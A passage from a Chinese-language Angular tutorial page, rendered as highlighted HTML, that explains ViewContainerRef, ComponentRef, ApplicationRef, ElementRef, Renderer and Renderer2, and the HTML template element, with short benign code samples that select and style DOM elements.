  abstract length<span class="token operator">:</span> number
  abstract <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token keyword">get</span><span class="token punctuation">(</span>index<span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef <span class="token operator">|</span> <span class="token keyword">null</span>
  abstract createEmbeddedView<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>templateRef<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> context<span class="token operator">?</span><span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">,</span> index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span>
  abstract createComponent<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>componentFactory<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">,</span> injector<span class="token operator">?</span><span class="token operator">:</span> Injector<span class="token punctuation">,</span> projectableNodes<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ngModule<span class="token operator">?</span><span class="token operator">:</span> NgModuleRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span>
  abstract <span class="token function">insert</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">,</span> index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef
  abstract <span class="token function">move</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">,</span> currentIndex<span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef
  abstract <span class="token function">indexOf</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">)</span><span class="token operator">:</span> number
  abstract <span class="token function">remove</span><span class="token punctuation">(</span>index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token function">detach</span><span class="token punctuation">(</span>index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef <span class="token operator">|</span> <span class="token keyword">null</span>
<span class="token punctuation">}</span>
<span class="token comment">//ComponentRef</span>
abstract <span class="token keyword">class</span> <span class="token class-name">ComponentRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  abstract location<span class="token operator">:</span> ElementRef <span class="token comment">// 组件实例的宿主元素所在的位置</span>
  abstract injector<span class="token operator">:</span> Injector <span class="token comment">// 组件实例存在的注射器</span>
  abstract instance<span class="token operator">:</span> <span class="token constant">C</span> <span class="token comment">// 组件实例</span>
  abstract hostView<span class="token operator">:</span> ViewRef <span class="token comment">// 组件实例的宿主视图ViewRef</span>
  abstract changeDetectorRef<span class="token operator">:</span> ChangeDetectorRef <span class="token comment">// 组件的ChangeDetectorRef</span>
  abstract componentType<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token comment">// 组件类型</span>
  abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token comment">// 销毁组件实例及其附加数据</span>
  abstract <span class="token function">onDestroy</span><span class="token punctuation">(</span>callback<span class="token operator">:</span> Function<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token comment">// 允许注册将在组件销毁时调用的回调。</span>
<span class="token punctuation">}</span>
<span class="token comment">// ApplicationRef</span>
<span class="token keyword">interface</span> <span class="token class-name">ApplicationRef</span> <span class="token punctuation">{</span>
  componentTypes<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
  components<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
  isStable<span class="token operator">:</span> Observable<span class="token operator">&lt;</span>boolean<span class="token operator">&gt;</span>
  viewCount
  bootstrap<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>componentOrFactory<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token operator">|</span> Type<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> rootSelectorOrNode<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span>
  <span class="token function">tick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  <span class="token function">attachView</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  <span class="token function">detachView</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br></div></div><h2 id="renderer-elementref"><a href="#renderer-elementref" class="header-anchor">#</a> Renderer/ElementRef</h2> <p>在应用层直接操作 DOM，就会造成应用层与渲染层之间强耦合，导致我们的应用无法运行在不同环境，如 web worker 中，因为在 web worker 环境中，是不能直接操作 DOM。有兴趣的读者，可以阅读一下 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers" target="_blank" rel="noopener noreferrer">Web Workers 中支持的类和方法<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 这篇文章。通过 ElementRef 我们就可以封装不同平台下视图层中的 native 元素 (在浏览器环境中，native 元素通常是指 DOM 元素)，最后借助于 Angular 提供的强大的依赖注入特性，我们就可以轻松地访问到 native 元素。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;div&gt;Hello {{ name }}&lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  <span class="token comment">// 在构造函数中 this.elementRef = elementRef 是可选的，编译时会自动赋值</span>
  <span class="token comment">// function AppComponent(elementRef) { this.elementRef = elementRef; }</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> elementRef<span class="token operator">:</span> ElementRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> 
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 模板中的元素已创建完成</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>elementRef<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// let greetDiv: HTMLElement = this.elementRef.nativeElement.querySelector('div'); </span>
    <span class="token comment">// greetDiv.style.backgroundColor = 'red';</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>此外，我们可以使用使用Angular 内置的属性装饰器代替实现，如 @ContentChild、 @ContentChildren、@ViewChild、@ViewChildren</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit<span class="token punctuation">,</span> Renderer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;div #greet&gt;Hello {{ name }}&lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'greet'</span><span class="token punctuation">)</span>
  greetDiv<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span> <span class="token keyword">private</span> renderer<span class="token operator">:</span> Renderer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// this.greetDiv.nativeElement.style.backgroundColor  = 'red';</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>renderer<span class="token punctuation">.</span><span class="token function">setElementStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>greetDiv<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> <span class="token string">'backgroundColor'</span><span class="token punctuation">,</span> <span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="renderer-api"><a href="#renderer-api" class="header-anchor">#</a> Renderer API</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">Renderer</span> <span class="token punctuation">{</span>
  <span class="token comment">// 创建元素</span>
  abstract <span class="token function">createElement</span><span class="token punctuation">(</span>parentElement<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      debugInfo<span class="token operator">?</span><span class="token operator">:</span> RenderDebugInfo<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token comment">// 创建文本元素</span>
  abstract <span class="token function">createText</span><span class="token punctuation">(</span>parentElement<span class="token operator">:</span> any<span class="token punctuation">,</span> value<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      debugInfo<span class="token operator">?</span><span class="token operator">:</span> RenderDebugInfo<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token comment">// 设置文本</span>
  abstract <span class="token function">setText</span><span class="token punctuation">(</span>renderNode<span class="token operator">:</span> any<span class="token punctuation">,</span> text<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 设置元素Property</span>
  abstract <span class="token function">setElementProperty</span><span class="token punctuation">(</span>renderElement<span class="token operator">:</span> any<span class="token punctuation">,</span> propertyName<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      propertyValue<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 设置元素Attribute</span>
  abstract <span class="token function">setElementAttribute</span><span class="token punctuation">(</span>renderElement<span class="token operator">:</span> any<span class="token punctuation">,</span> attributeName<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      attributeValue<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    
  <span class="token comment">// 设置元素的Class</span>
  abstract <span class="token function">setElementClass</span><span class="token punctuation">(</span>renderElement<span class="token operator">:</span> any<span class="token punctuation">,</span> className<span class="token operator">:</span> string<span class="token punctuation">,</span>
      isAdd<span class="token operator">:</span> boolean<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    
  <span class="token comment">// 设置元素的样式</span>
  abstract <span class="token function">setElementStyle</span><span class="token punctuation">(</span>renderElement<span class="token operator">:</span> any<span class="token punctuation">,</span> styleName<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      styleValue<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>需要注意的是在 Angular 4.x+ 版本，我们使用 Renderer2 替代 Renderer (Angular V2)。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">Renderer2</span> <span class="token punctuation">{</span>
  abstract <span class="token function">createElement</span><span class="token punctuation">(</span>name<span class="token operator">:</span> string<span class="token punctuation">,</span> namespace<span class="token operator">?</span><span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  abstract <span class="token function">createComment</span><span class="token punctuation">(</span>value<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  abstract <span class="token function">createText</span><span class="token punctuation">(</span>value<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  abstract <span class="token function">setAttribute</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">,</span> value<span class="token operator">:</span> string<span class="token punctuation">,</span>
    namespace<span class="token operator">?</span><span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">removeAttribute</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">,</span> namespace<span class="token operator">?</span><span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">addClass</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">removeClass</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">setStyle</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> style<span class="token operator">:</span> string<span class="token punctuation">,</span> value<span class="token operator">:</span> any<span class="token punctuation">,</span> 
    flags<span class="token operator">?</span><span class="token operator">:</span> RendererStyleFlags2<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">removeStyle</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> style<span class="token operator">:</span> string<span class="token punctuation">,</span> flags<span class="token operator">?</span><span class="token operator">:</span> RendererStyleFlags2<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">setProperty</span><span class="token punctuation">(</span>el<span class="token operator">:</span> any<span class="token punctuation">,</span> name<span class="token operator">:</span> string<span class="token punctuation">,</span> value<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">setValue</span><span class="token punctuation">(</span>node<span class="token operator">:</span> any<span class="token punctuation">,</span> value<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">listen</span><span class="token punctuation">(</span>    <span class="token comment">//  👈 这个可以绑定事件，绑定后注意取消绑定</span>
      target<span class="token operator">:</span> <span class="token string">'window'</span><span class="token operator">|</span><span class="token string">'document'</span><span class="token operator">|</span><span class="token string">'body'</span><span class="token operator">|</span>any<span class="token punctuation">,</span> eventName<span class="token operator">:</span> string<span class="token punctuation">,</span>
      <span class="token function-variable function">callback</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> boolean <span class="token operator">|</span> <span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="templateref-viewcontainerref"><a href="#templateref-viewcontainerref" class="header-anchor">#</a> TemplateRef/ViewContainerRef</h2> <p>我们先来了解一下 HTML 模板元素<code>&lt;template&gt;</code> 。模板元素是一种机制，允许包含加载页面时不渲染，但又可以随后通过 JavaScript 进行实例化的客户端内容。我们可以将模板视作为存储在页面上稍后使用的一小段内容。</p> <p>在 html 标准引入 template 模板元素之前，我们都是使用 <code>&lt;script&gt;</code> 标签进行客户端模板的定义，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script id<span class="token operator">=</span><span class="token string">&quot;tpl-mock&quot;</span> type<span class="token operator">=</span><span class="token string">&quot;text/template&quot;</span><span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token constant">I</span> am span <span class="token keyword">in</span> mock template<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>对于支持 html template 模板元素的浏览器，我们可以这样创建客户端模板：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>template id<span class="token operator">=</span><span class="token string">&quot;tpl&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token constant">I</span> am span <span class="token keyword">in</span> template<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>下面我们来看一下 html template 模板元素的使用示例：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype">&lt;!DOCTYPE html&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>html Template Element Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>html Template Element Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Template Container --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>tpl-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Template --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>tpl<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>I am span in template<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Script --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">renderTpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'content'</span> <span class="token keyword">in</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> tpl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> tplContainer <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.tpl-container'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> tplNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">importNode</span><span class="token punctuation">(</span>tpl<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            tplContainer<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>tplNode<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span>  <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">&quot;Current browser doesn't support template element&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
